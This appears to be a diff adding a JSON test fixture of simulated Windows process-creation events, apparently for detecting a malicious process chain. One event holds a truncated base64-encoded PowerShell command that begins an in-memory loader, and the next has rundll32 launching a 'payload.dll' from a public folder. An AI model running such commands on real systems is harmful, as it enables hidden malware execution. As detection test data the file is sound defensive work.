@@ -1,0 +1,38 @@
+[
+  {
+    "timestamp": 1700000000.1,
+    "event_type": "ProcessCreate",
+    "pid": 1000,
+    "ppid": 400,
+    "image_path": "C:\\Windows\\System32\\explorer.exe",
+    "command_line": "explorer.exe",
+    "details": {}
+  },
+  {
+    "timestamp": 1700000005.5,
+    "event_type": "ProcessCreate",
+    "pid": 2048,
+    "ppid": 1000,
+    "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...==",
+    "details": {}
+  },
+  {
+    "timestamp": 1700000010.2,
+    "event_type": "ProcessCreate",
+    "pid": 3052,
+    "ppid": 2048,
+    "image_path": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "rundll32.exe C:\\Users\\Public\\payload.dll,EntryPoint",
+    "details": {}
+  },
+  {
+    "timestamp": 1700000015.8,
+    "event_type": "ProcessCreate",
+    "pid": 4100,
+    "ppid": 3052,
+    "image_path": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+    "command_line": "WmiPrvSE.exe -secured -Embedding",
+    "details": {}
+  }
+]
